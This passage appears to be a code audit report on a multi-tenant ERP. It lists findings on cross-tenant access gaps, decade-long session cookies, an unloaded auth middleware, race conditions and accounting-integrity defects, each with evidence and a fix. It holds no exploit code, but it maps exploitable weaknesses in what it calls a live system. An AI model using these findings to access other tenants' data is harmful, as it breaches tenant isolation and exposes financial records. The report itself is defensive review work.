**Fix (summary):** Do not build a regex from user keys. Either escape the key before interpolation — `const safe = key.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');` then `new RegExp('\\{\\{\\s*'+safe+'\\s*\\}\\}','g')` — or, preferably, precompile one pattern `/\{\{\s*([\w.]+)\s*\}\}/g` and replace via a callback that looks the captured name up in `vars`. Safe to apply: behavior for legitimate `{{key}}` placeholders is unchanged.

---

#### ITMB-069 — Project material issues are never reconciled against BOQ quantities (no over-issue control)

- **Severity:** medium  •  **Confidence:** high  •  **Category:** verticals
- **Location:** `backend/src/modules/project-material-issues/project-material-issues.service.ts:126`

**What & why:** Neither create() (lines 24-53) nor post() (lines 126-273) ever references the project's BOQItem rows. The schema even provides ProjectMaterialIssueLine.boqItemId (schema line 5440) to link an issued line to its budget line, but the service never sets or reads it, and BOQItem (schema 5370-5397) carries only quantity/unitRate/totalAmount with no quantityIssued/quantityRemaining consumption tracking. post() decrements inventory, increments ConstructionProject.actualCost and books the 5200/1200 journal with no comparison to budgeted (BOQ) quantities and no cap.

**Evidence:** No BOQ/boqItem/quantityRemaining/quantityIssued reference anywhere in the service. post() body (lines 138-263) touches only inventoryBalance, inventoryMovement, constructionProject.actualCost and chartOfAccount. BOQItem schema has no consumption field; ProjectMaterialIssueLine.boqItemId (schema 5440) exists but is unused by the service.

**Impact:** A site clerk can issue and POST material quantities exceeding the Bill of Quantities with no warning or block, so actualCost can silently overrun the budget and project variance/profitability reporting is unreliable. This is a missing cost-control safeguard in the construction vertical (defense-in-depth / reporting), not data corruption — hence medium rather than high.

**Fix (summary):** Add a BOQ reconciliation step in post() (or submit()): for each line resolve the matching BOQItem (via line.boqItemId, or productId mapped to a BOQ line), sum already-POSTED issued quantity for that BOQ line plus the current line quantity, and compare to BOQItem.quantity less a configurable wastage tolerance. If exceeded, either throw BadRequestException or require an explicit over-issue approval flag; at minimum persist and surface a variance warning. Keep it non-breaking on a live app by gating the hard block behind a company setting/tolerance.

---

#### ITMB-070 — Purchase-order pay() ignores prior partial payments — overwrites paidAmount to full total, posts no JE, no row lock

- **Severity:** medium  •  **Confidence:** high  •  **Category:** payment status / balance integrity
- **Location:** `backend/src/modules/purchase-orders/purchase-orders.service.ts:468`

**What & why:** pay() re-reads `existing` outside any transaction with no row lock (lines 469-472), then unconditionally sets `paidAmount: existing.totalAmount, outstandingAmount: 0, paymentStatus: 'PAID'` (lines 484-486) regardless of how much was already paid. It computes `payAmount = Number(existing.outstandingAmount)` (line 478) but immediately discards it with `void payAmount` (line 479) and never uses it for the write — so there is no partial-payment support. The only guard is `paymentStatus === 'PAID'` (line 474). No journal entry is posted for the cash outflow even though the PO is flipped to PAID.

**Evidence:** Lines 478-489: `const payAmount = Number(existing.outstandingAmount); void payAmount;` then update sets `paidAmount: existing.totalAmount, outstandingAmount: 0, paymentStatus: 'PAID'`; payAmount is explicitly voided; no postingEngine import/call in the file.

**Impact:** A PO that was partially paid elsewhere is force-marked fully PAID with paidAmount=totalAmount, masking the real outstanding balance to the supplier; and no GL cash/AP entry is produced, so AP and cash in the ledger never reflect PO settlements. The endpoint cannot record true partial payments.

**Fix (summary):** Lock the PO row (SELECT ... FOR UPDATE) inside a transaction, compute newPaid = existing.paidAmount + payAmount, set paymentStatus from the resulting outstanding (PARTIAL vs PAID), reject overpayment, and post a balanced AP/Cash journal entry for the actual amount paid. Capture the settlement bank/cash account on PayPurchaseOrderDto.

---

#### ITMB-071 — Quotation/proforma conversion generates the sales-order number with Date.now().toString(36), risking collisions and sequence bypass

- **Severity:** medium  •  **Confidence:** high  •  **Category:** Concurrency/correctness
- **Location:** `backend/src/modules/quotations/quotations.service.ts:194`

**What & why:** convertToSalesOrder() builds the SO number as salesOrderNumber: 'SO-'+year+'-'+Date.now().toString(36).toUpperCase() (quotations line 194; identical in proforma-invoices.service.ts line 91). This bypasses EntityCodeGeneratorService (used by SalesOrdersService.create for every other SalesOrder), so converted orders get a non-sequential, format-divergent number, and two conversions within the same millisecond produce identical strings. salesOrderNumber is @unique (schema.prisma line 406), so a collision throws P2002/500.

**Evidence:** quotations.service.ts line 194 salesOrderNumber: `SO-${new Date().getFullYear()}-${Date.now().toString(36).toUpperCase()}`; proforma-invoices.service.ts line 91 identical; schema.prisma line 406 salesOrderNumber String @unique.

**Impact:** Converted sales orders fall outside the normal SO sequence (gaps/format inconsistency in financial records) and concurrent conversions can collide on salesOrderNumber, causing a unique-constraint 500 and a failed conversion.

**Fix (summary):** Generate the number via EntityCodeGeneratorService.next({ entityType: 'SalesOrder', companyId, tx }) inside the conversion transaction, matching SalesOrdersService.create().

---

#### ITMB-072 — Rent invoice create/update blindly spread the client DTO with no company-scope assertion and per-record scope missing on findOne/update/remove

- **Severity:** medium  •  **Confidence:** high  •  **Category:** Multi-tenancy / Input validation
- **Location:** `backend/src/modules/rent-invoices/rent-invoices.service.ts:14`

**What & why:** create() does this.prisma.rentInvoice.create({ data: { ...dto, invoiceDate } }) (lines 14-23) - it spreads the entire DTO (including the client-supplied companyId and all monetary fields) with no companyScope.assertCanAccessCompany check. findOne (lines 36-42) filters only on { id, deletedAt: null } with no company scope, and update (lines 44-51) / remove (lines 53-60) gate solely on that findOne, so any rent invoice is updatable/deletable by id regardless of tenant. Only findAll applies companyWhereFor. The DTO marks amount/taxAmount/totalAmount @IsOptional() @IsNumber() with no lower bound, so zero/negative/inconsistent amounts are accepted.

**Evidence:** lines 15-21 data: { ...(dto as any), ... } with no assertCanAccessCompany; findOne lines 37-38 where { id, deletedAt: null }; update lines 45-49 fetch via findOne(id) then update with no scope check; dto lines 18-28 optional unbounded amount/taxAmount/totalAmount.

**Impact:** A user can create a rent invoice under an arbitrary companyId and read/update/delete another company's rent invoices by id, breaching tenant isolation; arbitrary client-supplied amounts are stored unchecked.

**Fix (summary):** Call companyScope.assertCanAccessCompany(user, dto.companyId, 'WRITE') in create, and in findOne/update/remove load the record and assert access on its companyId (or apply companyWhereFor to the findFirst); add @Min(0) to monetary DTO fields.

---

#### ITMB-073 — Restaurant order findOne and create lack company-scope enforcement (cross-tenant read and create)

- **Severity:** medium  •  **Confidence:** high  •  **Category:** Multi-tenancy
- **Location:** `backend/src/modules/restaurant-orders/restaurant-orders.controller.ts:24`

**What & why:** The findOne controller is findOne(@Param('id') id) { return this.service.findOne(id); } (controller lines 24-26) - it never passes req.user, and RestaurantOrdersService.findOne (service lines 50-57) filters only on { id, deletedAt: null } with no company-scope where. Separately, create() (service lines 14-36) never calls companyScope.assertCanAccessCompany before inserting under the client-supplied dto.companyId. findAll does apply companyWhereFor, so the leak is specifically via direct-id access and unscoped create. (The controller also has a @Patch handler create2 that wrongly calls service.create, a separate defect.)

**Evidence:** controller lines 24-26 findOne(@Param('id') id: string) { return this.service.findOne(id); }; service findOne lines 51-52 where: { id, deletedAt: null } only; create lines 14-24 has no assertCanAccessCompany.

**Impact:** Cross-tenant data exposure: order details (guest, amounts, payment status) of other Itemba Group companies are retrievable by id, and an order can be created under another company's id - a tenant-isolation breach in production.

**Fix (summary):** Pass req.user into findOne and apply companyWhereFor(user,'READ') to the where (as quotations/proforma findOne do); in create() call companyScope.assertCanAccessCompany(user, dto.companyId, 'WRITE') before the insert.

---

#### ITMB-074 — Five operational document numbers use count()+1 with no transaction -> P2002 crash under concurrency (stock-damage, project-billing, project-progress, trip-expenses, vehicle-maintenance)

- **Severity:** medium  •  **Confidence:** high  •  **Category:** numbering
- **Location:** `backend/src/modules/stock-damage/stock-damage.service.ts:18`

**What & why:** Five modules mint document numbers as company-scoped COUNT(*)+1 with the same read-modify-write race and no $transaction around number+create: stock-damage.service.ts:18-28 (DMG-${year}-${count+1}, field damageNumber), project-billing.service.ts:23-33 (PBIL-, billingNumber), project-progress.service.ts:13-23 (PROG-, progressNumber), trip-expenses.service.ts:12-21 (TEXP-, tripExpenseNumber), vehicle-maintenance.service.ts:13-22 (MAINT-, maintenanceNumber). Each field is @@unique([companyId, <field>]) (schema.prisma: damageNumber 4075, billingNumber 5539, progressNumber 5506, tripExpenseNumber 4785, maintenanceNumber 6233), so concurrent creates for the same company+year emit identical numbers and the loser fails P2002 (500). project-billing is financial (progress-billing references). NOTE: returnable-packages was originally grouped here but is DROPPED from the count-of-six: its number is field packageCode (GLOBAL @unique, schema.prisma:4086) not a [companyId, packageNumber] field, so the original constraint claim was wrong -- it shares the same count()+1 race (returnable-packages.service.ts:16-21) but with a different field/scope.

**Evidence:** stock-damage:18-28; project-billing:23-33; project-progress:13-23; trip-expenses:12-21; vehicle-maintenance:13-22 -- all count()+1, plain create, no $transaction. Unique constraints schema.prisma 4075/5539/5506/4785/6233. ProjectBilling default 'PBI-{YYYY}-' (defaults.ts:66) != inline 'PBIL-'; no defaults for the other four. returnable-packages field packageCode @unique schema.prisma:4086 (original [companyId,packageNumber] claim incorrect).

**Impact:** Concurrent creation 500s on the loser across these five modules; project-billing collisions affect revenue-recognition traceability. Same root defect spread across multiple files.

**Fix (summary):** For each module, move count+create into a single $transaction with a P2002 retry to preserve the existing prefix (DMG/PBIL/PROG/TEXP/MAINT). CAUTION before routing through codes.next(): DEFAULT_PATTERNS prefixes do NOT all match the inline ones -- ProjectBilling default is 'PBI-{YYYY}-' (defaults.ts:66) vs inline 'PBIL-', and there are NO defaults for StockDamage / ProjectProgressRecord / TripExpense / VehicleMaintenance (fallbackPattern would derive different prefixes). So the tx+retry approach is the safe live-compatible fix; only use the generator after adding/aligning the correct prefixes. Do NOT add unique constraints (they already exist as @@unique([companyId,...])).

---

#### ITMB-075 — Auth cookies (including refresh) default to ~10-year max-age, far outliving the 30-day refresh token

- **Severity:** medium  •  **Confidence:** high  •  **Category:** Hardening / Session Management
- **Location:** `frontend/src/lib/auth-cookie-config.ts:1`

**What & why:** DEFAULT_SESSION_COOKIE_MAX_AGE_SECONDS = 60*60*24*365*10 (~10 years) at L1, exported as SESSION_COOKIE_MAX_AGE_SECONDS when AUTH_COOKIE_MAX_AGE_SECONDS is unset. This value is applied as maxAge to itemba_access, itemba_refresh, itemba_csrf and itemba_auth in login/route.ts (L38-61) and refresh/route.ts (L47-65). The backend refresh-token validity is ~30 days and the access JWT lives minutes, so the on-disk refresh cookie persists for a decade — long after the credential it carries is invalid. A cookie left on a shared/abandoned device, in a backup, or synced across browsers remains for years. This is the client-side counterpart of commit b7ad6d5 'Disable automatic session expiry'.

**Evidence:** auth-cookie-config.ts L1: const DEFAULT_SESSION_COOKIE_MAX_AGE_SECONDS = 60 * 60 * 24 * 365 * 10; applied to itemba_refresh at login/route.ts L44-48 and refresh/route.ts L53-57.

**Impact:** Refresh-cookie material lingers on client devices for ~10 years with no client-side expiry, widening the window for cookie theft on shared/abandoned devices and weakening device hygiene on a multi-company ERP. The 10y cookie lifetime is mismatched with credential validity (30d/minutes).

**Fix (summary):** Lower the default to align with refresh-token lifetime (e.g. 30 days = 60*60*24*30) so cookies expire alongside the credential; keep AUTH_COOKIE_MAX_AGE_SECONDS as an opt-in override. Safe to apply since access/refresh are renewed on each refresh call.

---

#### ITMB-076 — All auth/session cookies issued with a ~10-year Max-Age, giving captured cookies an effectively unlimited reuse window

- **Severity:** medium  •  **Confidence:** high  •  **Category:** Session Management
- **Location:** `frontend/src/lib/auth-cookie-config.ts:1`

**What & why:** DEFAULT_SESSION_COOKIE_MAX_AGE_SECONDS = 60*60*24*365*10 (~10 years, commented 'effectively non-expiring'), and the AUTH_COOKIE_MAX_AGE_SECONDS env override is unset in this deployment (frontend/.env.local does not define it), so SESSION_COOKIE_MAX_AGE_SECONDS resolves to the ~10-year default (auth-cookie-config.ts lines 1 and 17-18). That value is applied as Max-Age to every auth cookie: the httpOnly `itemba_access` (login/route.ts:67; backend proxy route.ts:166), the httpOnly refresh cookies `itemba_refresh` and `itemba_backend_refresh` (login/route.ts:21,30 via setRefreshCookies), the non-httpOnly `itemba_auth` flag (login/route.ts:81), and the non-httpOnly `itemba_csrf` cookie (login/route.ts:90). The same SESSION_COOKIE_MAX_AGE_SECONDS is reused throughout the backend proxy route (route.ts:166-238). Corresponds to commit b7ad6d5 'Disable automatic session expiry'.

**Evidence:** auth-cookie-config.ts:1 `const DEFAULT_SESSION_COOKIE_MAX_AGE_SECONDS = 60 * 60 * 24 * 365 * 10;`; lines 17-18 `export const SESSION_COOKIE_MAX_AGE_SECONDS = parseMaxAge(process.env.AUTH_COOKIE_MAX_AGE_SECONDS) ?? DEFAULT_...;` with AUTH_COOKIE_MAX_AGE_SECONDS unset in frontend/.env.local. Applied as `maxAge: SESSION_COOKIE_MAX_AGE_SECONDS` at login/route.ts:21,30,67,81,90 and backend route.ts:166-238.

**Impact:** Any captured session cookie remains presentable for up to a decade with no time-based forced re-authentication on this live multi-company ERP. The httpOnly itemba_access cookie grants authenticated access to financial/HR/banking data; the non-httpOnly itemba_auth/itemba_csrf cookies are additionally exposed to any XSS. The practical compromise window then depends entirely on backend token revocation/expiry, which for long-lived JWT access tokens is often weak.

**Fix (summary):** Align cookie Max-Age with token lifetimes: set a short Max-Age for itemba_access (e.g. 15-60 min, matching the backend JWT exp) and a bounded Max-Age for the refresh cookies (e.g. 7-30 days) backed by the existing server-side refresh rotation. Implement 'stay signed in' via refresh-token rotation rather than a multi-year cookie. Roll this out by changing the default in auth-cookie-config.ts (or setting AUTH_COOKIE_MAX_AGE_SECONDS) and verifying refresh still re-issues cookies before old ones expire so users are not logged out unexpectedly.

---

#### ITMB-077 — Edge auth middleware is dead code: proxy.ts is never loaded as Next.js middleware, so server/edge route protection never runs (page gate is client-only)

- **Severity:** medium  •  **Confidence:** high  •  **Category:** Broken Access Control / Auth Enforcement
- **Location:** `frontend/src/proxy.ts:12`

**What & why:** Next.js (this repo uses next 14.2.33, dependency and resolved) only loads Edge middleware from a file literally named middleware.ts/.js in the project root or src/, and it must export a function named `middleware` (default or named). frontend/src/proxy.ts instead exports `export function proxy(req: NextRequest)` (line 12) plus `export const config = { matcher: ['/((?!_next/static|_next/image|favicon.ico|api).*)'] }` (line 30). Verified: (1) no middleware.ts/.js exists anywhere in frontend/src or frontend/ root (only proxy.ts and proxy.test.ts); (2) the only importer of `proxy` is proxy.test.ts (line 2, suite labelled 'middleware route protection'), confirming it was intended to run as live middleware; (3) no build step in package.json (scripts are plain next dev/build/start/lint), the frontend Dockerfile, or any script renames proxy.ts -> middleware.ts. Therefore the cookie-presence redirect to /login never executes server-side. The sole remaining gate for protected pages is the client-side redirect in frontend/src/app/(dashboard)/layout.tsx ('use client'; useEffect at lines 13-17 calling router.replace('/login') only after !isLoading && !user), which runs only after React mounts.

**Evidence:** proxy.ts:12 `export function proxy(req: NextRequest) {`; proxy.ts:30-32 `export const config = { matcher: ['/((?!_next/static|_next/image|favicon.ico|api).*)'] };`. No middleware.ts/.js in frontend/src or frontend/. Only importer of `proxy` is proxy.test.ts:2 (suite 'middleware route protection'). Client-only gate at app/(dashboard)/layout.tsx:13-17. next 14.2.33.

**Impact:** The intended edge route gate is non-functional. Unauthenticated requests to protected page routes are not redirected server-side; the browser downloads the protected client shell and only redirects after hydration (UX flash, full reliance on client JS). Actual data remains protected today because the /api/backend proxy requires the httpOnly access/refresh cookie (401 otherwise) and the backend enforces RBAC, so this is a lost defense-in-depth layer rather than direct data exposure. It would become a real bypass the moment any protected page does SSR/server-side data fetching that assumes middleware already authenticated the request.

**Fix (summary):** Add frontend/src/middleware.ts that re-exports the existing logic so Next loads it without breaking the test that imports { proxy }: `export { config } from './proxy'; export { proxy as middleware } from './proxy';`. Do NOT simply rename the function (proxy.test.ts imports `{ proxy }` from './proxy' and would break). After deploying, confirm an unauthenticated request to a protected path returns a 307 redirect to /login. Keep the existing config.matcher (it already excludes _next/static, _next/image, favicon.ico, and api).

---

#### ITMB-078 — External payment confirm/reverse have no row lock or transaction (check-then-act status race, double-confirm window)

- **Severity:** medium  •  **Confidence:** medium  •  **Category:** payment status / race
- **Location:** `backend/src/modules/external-payments/external-payments.service.ts:108`

**What & why:** confirmTrusted() reads the record via findFirst with no lock (lines 113-115), checks status (lines 120-125), and then issues a separate plain update to SUCCESS (lines 127-135) outside any transaction. reverseTrusted() does the same to REVERSED (lines 153-170). Two concurrent confirm calls (e.g. a provider webhook racing a manual confirm, or two webhook retries) both read status INITIATED/PENDING, both pass the guard, both write SUCCESS, and both emit EXTERNAL_PAYMENT_CONFIRMED audit logs — the check-then-act is not atomic. createTrusted has an idempotency replay guard, but confirm/reverse do not.

**Evidence:** Lines 120-135: status guard on the pre-read `record` followed by a plain prisma.externalPayment.update(...); no transaction, no conditional where-clause on status. reverseTrusted lines 160-170 follow the identical pattern.

**Impact:** A provider webhook and a user action (or two webhook retries) can both confirm the same external payment, producing a duplicate confirmation audit trail and, if downstream consumers act on EXTERNAL_PAYMENT_CONFIRMED, potential double application of the payment to an invoice/order.

**Fix (summary):** Perform the status transition with a conditional atomic update: `updateMany({ where: { id, status: { in: ['INITIATED','PENDING'] } }, data: { status: 'SUCCESS', ... } })` and treat count === 0 as already-confirmed/invalid; same pattern for reverse (where status = 'SUCCESS'). Optionally wrap with SELECT ... FOR UPDATE in a transaction.

---

#### ITMB-079 — Fuel credit sale totalAmount is client-supplied and never reconciled against litres * pricePerLitre or the official fuel price

- **Severity:** medium  •  **Confidence:** medium  •  **Category:** Pricing integrity
- **Location:** `backend/src/modules/fuel-credit-sales/fuel-credit-sales.service.ts:18`

**What & why:** create() persists litres, pricePerLitre and totalAmount straight from the DTO (lines 22-24) and books the Receivable amount/outstanding from dto.totalAmount (lines 36-37) with no check that totalAmount == litres * pricePerLitre and no lookup of the authoritative price (a fuel-prices module exists). CreateFuelCreditSaleDto accepts all three as independent @IsNumber() fields (dto lines 10-17). The receivable raised against the customer is therefore whatever totalAmount the client sends, decoupled from litres dispensed and the official price. (Note: this service exposes no update() method, so the issue is on the create path only.)

**Evidence:** lines 22-24 litres: dto.litres, pricePerLitre: dto.pricePerLitre, totalAmount: dto.totalAmount; lines 36-37 amount: dto.totalAmount, outstandingAmount: dto.totalAmount with no reconciliation; dto lines 10-17.

**Impact:** Forecourt credit sales can be booked with a totalAmount below litres x price, under-billing the customer's receivable and understating fuel revenue, or producing records where displayed litres/price do not reconcile to the amount owed.

**Fix (summary):** Compute totalAmount server-side as litres * pricePerLitre, sourcing pricePerLitre from the active fuel-prices record for the product/branch/date, and reject/ignore a mismatching client totalAmount.

---

#### ITMB-080 — harvest-records post() updates inventory balance via non-locking findFirst-then-create/update instead of the locking mutator

- **Severity:** medium  •  **Confidence:** medium  •  **Category:** concurrency
- **Location:** `backend/src/modules/harvest-records/harvest-records.service.ts:152`

**What & why:** post() writes a PRODUCTION_IN inventoryMovement and recomputes weighted-average cost inside a $transaction (lines 130-181), but it updates the balance by hand: tx.inventoryBalance.findFirst (lines 152-154) WITHOUT the SELECT ... FOR UPDATE row lock used by inventory-movements.service.ts:225, then update if present (lines 156-163) or create if absent (lines 164-175). For the FIRST harvest of a (companyId, productId, branchId) with no existing balance row, two concurrent posts can both observe balance === null and both call create, colliding on @@unique([companyId, productId, branchId]) (schema.prisma:2815) so one transaction aborts. For subsequent updates, concurrent harvests read the same averageCost/totalValue and the last writer overwrites the other's WAC recomputation (lost update on averageCost/totalValue). Inbound-only, so it cannot oversell, but it can corrupt valuation under concurrency and is inconsistent with the central locking path.

**Evidence:** const balance = await tx.inventoryBalance.findFirst({ where: { companyId, productId, branchId } }); if (balance) { const newAverage = newQty > 0 ? newTotalValue / newQty : ...; await tx.inventoryBalance.update({ where: { id: balance.id }, data: { quantityOnHand: newQty, totalValue: newTotalValue, averageCost: newAverage } }); } else { await tx.inventoryBalance.create({ ... }); }  // no FOR UPDATE lock; plain create collides on unique constraint under concurrency

**Impact:** Concurrent harvest postings for the same product/branch can fail on the unique constraint (first row) or silently lose a WAC update (subsequent rows), mis-stating averageCost/totalValue for harvested produce and feeding wrong COGS. Lower risk than outbound paths because quantity is additive.

**Fix (summary):** Route harvest stock-in through this.inventoryMovements.createMovement({ movementType: 'PRODUCTION_IN', quantity, unitCost: unitValue, ... , tx }) inside the existing transaction, reusing its FOR UPDATE lock and ON CONFLICT upsert + atomic WAC update, instead of the hand-rolled findFirst/create/update.

---

#### ITMB-081 — LWOP / unpaid-absence days double-counted when approved unpaid leave and an UNPAID_ABSENT attendance record cover the same day

- **Severity:** medium  •  **Confidence:** medium  •  **Category:** proration
- **Location:** `backend/src/modules/hr/payroll-runs/payroll-runs.service.ts:207`

**What & why:** calculate() builds lwopDays from two independent sources and adds them with no de-dup by calendar date: attendance ABSENT/UNPAID_ABSENT days (`lwopDays += attendanceUnpaidAbsentDays;`, line ~207) and approved unpaid LeaveRequests overlapping the period (`for (const lr of unpaidLeaveRequests) { const overlap = overlapDays(...); lwopDays += overlap; }`, lines ~244-247). If a day is both on approved unpaid leave and marked UNPAID_ABSENT/ABSENT in attendance (common when attendance is auto-marked for non-clock-in days), the same calendar day is deducted twice.

**Evidence:** payroll-runs.service.ts: attendance source `lwopDays += attendanceUnpaidAbsentDays;` (~:207); leave source loop `lwopDays += overlap;` (~:244-247); grep confirms attendanceUnpaidAbsentDays is used exactly once and there is no overlap/de-dup check before combining.

**Impact:** Over-deduction of base pay (lower gross and net) for affected employees, with an inflated LWOP day count in the note. Bounded only by the fullBasePay cap, so heavy overlap can erase the entire base salary.

**Fix (summary):** Collect the distinct set of unpaid calendar dates from both leave requests and attendance (e.g. a Set of YYYY-MM-DD) and deduct one day per distinct date instead of summing two independent counts.

---

#### ITMB-082 — Posting-runs post/reverse only flip a status flag (no journal entries) and use a non-atomic check-then-update race

- **Severity:** medium  •  **Confidence:** medium  •  **Category:** accounting-integrity
- **Location:** `backend/src/modules/posting-runs/posting-runs.service.ts:37`

**What & why:** postRun() (lines 37-52) sets status:'POSTED'/postedAt/postedById but creates ZERO JournalEntry rows; reverseRun() (lines 54-69) sets status:'REVERSED'/reversedAt/reversedById but creates no offsetting entries and never touches any linked JournalEntry. Both guard with a separate read-then-update — `const run = await this.findOne(id)` then `if (run.status !== 'DRAFT'/'POSTED')` then `this.prisma.postingRun.update(...)` — with no $transaction, so two concurrent calls can both pass the status check before either writes.

**Impact:** If a posting run is intended as the act of posting a batch to the GL, the run is marked POSTED while nothing reaches the ledger (silent no-op), and 'reversing' creates no offsetting entries, so the status field misrepresents ledger reality. The check-then-update race additionally allows the same run to be processed twice.

**Fix (summary):** If PostingRun is purely descriptive metadata, remove the misleading post/reverse mutations. If it is meant to drive the ledger, implement the actual JournalEntry create/reverse inside a single $transaction. In all cases make the state transition race-safe with a conditional updateMany asserting it claimed exactly one DRAFT/POSTED row, e.g. `const r = await this.prisma.postingRun.updateMany({ where: { id, status: 'DRAFT' }, data: { status: 'POSTED', postedAt: new Date(), postedById: userId } }); if (r.count !== 1) throw new BadRequestException('Only draft runs can be posted');` (mirror for reverse with status: 'POSTED').

---

#### ITMB-083 — Project billing 'send' increments billedAmount with no cap against contract value or progress

- **Severity:** medium  •  **Confidence:** medium  •  **Category:** verticals
- **Location:** `backend/src/modules/project-billing/project-billing.service.ts:63`

**What & why:** send() flips a DRAFT billing to SENT and increments ConstructionProject.billedAmount by Number(b.amount) (line 68) with no check that cumulative billedAmount stays within the project's contractValue (ConstructionProject.contractValue exists, schema line 5266) and no linkage to approved progress. ProjectProgressRecord.percentComplete is validated 0-100 only per single record (project-progress.service.ts lines 14 and 50), never as a cumulative project total, so a project can be billed beyond 100% of contract value and beyond reported physical progress.

**Evidence:** send() lines 63-71 increment billedAmount unconditionally; schema.prisma line 5266 ConstructionProject.contractValue exists; project-progress.service.ts validates percentComplete 0-100 only per single record (lines 14, 50), never the cumulative project total.

**Impact:** Construction billing can exceed contract value and outrun physical progress, the exact over-billing the BOQ/progress controls are meant to prevent. Finance dashboards comparing billedAmount to contractValue/progress% can show impossible (>100%) figures, undermining revenue-recognition and WIP reporting. This is a missing soft control, not a correctness/corruption bug.

**Fix (summary):** In send(), load the project's contractValue and current billedAmount and warn/reject if billedAmount + b.amount would exceed contractValue plus a configurable variation-order tolerance. Because variation orders legitimately exceed the original contract on a live system, prefer a configurable tolerance or a warning-plus-override rather than an unconditional hard reject so existing workflows are not broken.

---

#### ITMB-084 — Rent invoices have no period-duplicate guard - the same lease period can be invoiced twice

- **Severity:** medium  •  **Confidence:** medium  •  **Category:** verticals
- **Location:** `backend/src/modules/rent-invoices/rent-invoices.service.ts:12`

**What & why:** create() (lines 12-24) blindly inserts a RentInvoice from the DTO with no uniqueness/overlap check on (leaseAgreementId, billingPeriodStart, billingPeriodEnd). The schema's only unique constraint is (companyId, rentInvoiceNumber), which does not stop a second invoice covering the same rental period. There is no recurring/period-generation routine (grep for generate/recurring/billingCycle/period in the module returned nothing), so nothing prevents two invoices for the same lease and period.

**Evidence:** create() lines 12-24 has no pre-insert lookup. Schema unique is only (companyId, rentInvoiceNumber) (schema line 6170). Grep for generate/recurring/nextInvoice/billingCycle/period in the module returned no matches; findAll/update/issue/remove contain no period-dedupe logic.

**Impact:** Tenants can be invoiced twice for the same period (manual double entry or a retried client request), inflating receivables and corrupting rent statements, with no way to reconcile leases against rent invoices reliably in the rental vertical.

**Fix (summary):** Before create(), look up an existing non-deleted RentInvoice for the same leaseAgreementId whose [billingPeriodStart, billingPeriodEnd] overlaps the requested period (billingPeriodStart < requestedEnd AND billingPeriodEnd > requestedStart) and reject or return the existing one. Optionally add a unique composite index on (leaseAgreementId, billingPeriodStart) plus an idempotent generateForPeriod() routine.

---

#### ITMB-085 — Auto-commission created after the confirm transaction via non-atomic check-then-insert with no unique constraint, allowing duplicate (or silently dropped) commissions

- **Severity:** medium  •  **Confidence:** medium  •  **Category:** Concurrency/race condition
- **Location:** `backend/src/modules/sales-orders/sales-orders.service.ts:241`

**What & why:** confirm() calls maybeCreateAutoCommission(id, user?.id) AFTER its $transaction commits (call at line 241; tx ends line 240). maybeCreateAutoCommission (lines 245-271) uses this.prisma (not tx), does a findFirst existence check (lines 253-256) then a separate create (lines 259-267). This check-then-insert is not atomic and the SalesCommission model has NO unique constraint on salesOrderId (schema.prisma lines 457-465), so two concurrent/retried confirms can both pass findFirst and both insert. The whole method is wrapped in try/catch that swallows errors, so a transient failure leaves a confirmed order with no commission and only silent loss.

**Evidence:** line 241 await this.maybeCreateAutoCommission(id, user?.id) outside the tx (ends line 240); lines 253-259 const existing = await this.prisma.salesCommission.findFirst(...); if (existing) return; ... await this.prisma.salesCommission.create(...); schema.prisma SalesCommission (lines 457-465) has no unique index.

**Impact:** Duplicate DRAFT commissions inflate salesperson payouts; alternatively a transient failure silently drops a legitimate commission. Both are financial-accuracy defects.

**Fix (summary):** Add a @@unique([salesOrderId]) (or [salesOrderId, employeeId]) constraint to SalesCommission, move commission creation inside the confirm $transaction using tx, and create-with-P2002-catch (or upsert) instead of findFirst-then-create; do not swallow non-P2002 errors silently.

---

#### ITMB-086 — Tax auto-apply fails open: lookup/DB errors return booked:0+error instead of throwing, so VAT silently fails to post while the order still confirms (latent — feature defaults off)

- **Severity:** medium  •  **Confidence:** medium  •  **Category:** reliability/financial-correctness
- **Location:** `backend/src/modules/tax-auto-apply/tax-auto-apply.service.ts:127`

**What & why:** TaxAutoApplyService.apply() catches errors during the source-order lookup (lines 127-130) and the default-tax-code lookup (lines 162-165) and, rather than throwing, returns a TaxApplyResult with `.error` set and `booked: 0`. The class docstring (lines 24-27) documents this 'soft-fail' design so callers can run it inside a $transaction without aborting the source order. Order-confirmation callers therefore treat a transient DB error or a missing/inactive default TaxCode identically to the benign 'nothing to book' case, letting confirmation proceed while the VAT TaxTransaction + journal entry are silently skipped. This is currently latent and mitigated because the feature is env-gated and defaults OFF (line 49: `(process.env.TAX_AUTO_APPLY ?? 'false') === 'true'`), so disabled callers short-circuit to `{ disabled: true }` before reaching these catch paths.

**Evidence:** Lines 127-130 `} catch (err) { result.error = err instanceof Error ? err.message : String(err); return result; }`; lines 162-165 the analogous catch for the default-tax-code lookup returning `result` without throwing; line 49 shows the env-flag default of 'false'.

**Impact:** When TAX_AUTO_APPLY is enabled, VAT filing reports that aggregate from the TaxTransaction ledger never see an order whose tax determination failed, understating output VAT liability or input credit for a Tanzania ERP. The only trace is a warn log indistinguishable from the legitimate 'no tax to book' result. Today the env-flag default keeps this dormant, hence medium rather than high.

**Fix (summary):** Distinguish 'legitimately nothing to book' (disabled / zero-tax lines, already-booked) from 'failed to determine tax' (the catch paths at 127-130 and 162-165 and the no-default branch at 167-171). When the feature is enabled, surface the hard-failure result to the caller as a visible/fatal error (or persist a 'tax-pending' marker on the order) so a retry or alert can reconcile it, instead of returning `booked:0 + error` that callers swallow as a no-op.

---


### LOW severity

#### ITMB-087 — Single lenient global Throttler (100/60s) governs both cheap CRUD and expensive uncapped list/render endpoints

- **Severity:** low  •  **Confidence:** high  •  **Category:** DoS / Rate limiting
- **Location:** `backend/src/app.module.ts:334`

**What & why:** app.module.ts registers one ThrottlerModule.forRoot factory with `ttl: configService.get('THROTTLE_TTL',60)*1000` and `limit: configService.get('THROTTLE_LIMIT',100)` (L334-335) and a single global ThrottlerGuard. A codebase search for `@Throttle(` / `@SkipThrottle` returned no per-route overrides, so the same 100-req/60s budget governs trivial GETs and the expensive routes (uncapped list endpoints from finding 1 and the CPU-heavy print-engine render endpoints from finding 2).

**Evidence:** app.module.ts L332-335 single throttler factory `[{ ttl: THROTTLE_TTL*1000, limit: THROTTLE_LIMIT(100) }]`; grep for `@Throttle(`/`@SkipThrottle` across backend/src = no matches.

**Impact:** The most DB/CPU-intensive endpoints get the same generous allowance as cheap ones, so a single authenticated principal can sustain heavy list-dump or render requests within budget and degrade the shared multi-tenant worker. This is an amplifier of findings 1 and 2 rather than an independent vulnerability — lower severity, and largely mitigated by fixing the per-request limits in those findings.

